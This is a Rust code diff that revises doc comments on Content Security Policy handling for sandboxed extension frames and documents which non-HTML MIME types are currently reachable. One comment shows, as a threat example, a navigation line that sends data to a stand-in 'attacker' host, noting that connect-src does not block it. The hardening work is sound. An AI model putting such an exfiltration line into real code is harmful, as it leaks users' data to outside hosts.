@@ -216,7 +216,9 @@ fn content_security_policy(origin: &str) -> String {
 /// exists at all. It names the frame-host origin, which deliberately leaves a
 /// multi-page HTML extension able to navigate within itself. Non-HTML documents
 /// reachable that way are neutralised by policy instead — see
-/// [`document_content_security_policy`] — rather than by forbidding navigation. `connect-src 'none'` on the extension document stops fetch,
+/// [`asset_content_security_policy`] — rather than by forbidding navigation.
+///
+/// `connect-src 'none'` on the extension document stops fetch,
 /// WebSocket and EventSource — it does **not** stop `location.href = "https://
 /// attacker/?d=" + data`, because navigation is not a fetch directive. A
 /// `sandbox="allow-scripts"` frame cannot navigate its parent, but it can
@@ -385,6 +387,13 @@ fn document_with_lockdown(html: &str, origin: &str) -> String {
 /// `script-src 'none'` on served JavaScript would break legitimate workers and
 /// `importScripts`. Scripts, styles, fonts and images are *subresources*: they
 /// do not get a realm, and they keep what they legitimately need.
+///
+/// Reachability, so the list is not read as a claim about current exposure:
+/// only `image/svg+xml` is presently reachable. `content_type_for` maps
+/// `.xml`/`.xhtml` to `application/octet-stream` with `nosniff`, which is
+/// inert, so those two entries close no live route today. They are deliberate
+/// future-proofing against the MIME table gaining those extensions later —
+/// kept so that change cannot silently open a route-2 vector.
 const ACTIVE_NON_HTML_DOCUMENT_TYPES: &[&str] = &[
     "image/svg+xml",
     "application/xhtml+xml",
